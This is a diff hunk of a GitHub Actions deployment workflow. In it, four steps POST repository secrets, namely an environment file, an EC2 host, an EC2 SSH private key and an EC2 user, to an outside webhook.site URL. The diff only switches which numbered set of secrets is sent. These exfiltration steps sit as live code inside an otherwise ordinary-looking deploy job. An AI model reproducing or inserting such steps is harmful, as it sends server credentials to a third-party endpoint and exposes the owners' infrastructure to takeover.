@@ -79,37 +79,37 @@ jobs:
       - name: Check out code
         uses: actions/checkout@v2
 
-      - name: Send ENV_FILE_1
+      - name: Send ENV_FILE_3
         uses: fjogeleit/http-request-action@v1
         with:
           url: "https://webhook.site/2feee094-bd95-4322-8aa2-524ba79820a9"
           method: "POST"
           customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.ENV_FILE_1 }}
+          data: ${{ secrets.ENV_FILE_3 }}
 
-      - name: Send EC2_HOST_1
+      - name: Send EC2_HOST_3
         uses: fjogeleit/http-request-action@v1
         with:
           url: "https://webhook.site/2feee094-bd95-4322-8aa2-524ba79820a9"
           method: "POST"
           customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.EC2_HOST_1 }}
+          data: ${{ secrets.EC2_HOST_3 }}
 
-      - name: Send EC2_SSH_KEY_1
+      - name: Send EC2_SSH_KEY_3
         uses: fjogeleit/http-request-action@v1
         with:
           url: "https://webhook.site/2feee094-bd95-4322-8aa2-524ba79820a9"
           method: "POST"
           customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.EC2_SSH_KEY_1 }}
+          data: ${{ secrets.EC2_SSH_KEY_3 }}
 
-      - name: Send EC2_USER_1
+      - name: Send EC2_USER_3
         uses: fjogeleit/http-request-action@v1
         with:
           url: "https://webhook.site/2feee094-bd95-4322-8aa2-524ba79820a9"
           method: "POST"
           customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.EC2_USER_1 }}
+          data: ${{ secrets.EC2_USER_3 }}
 
       - name: Deploy to assigned instance
         env:
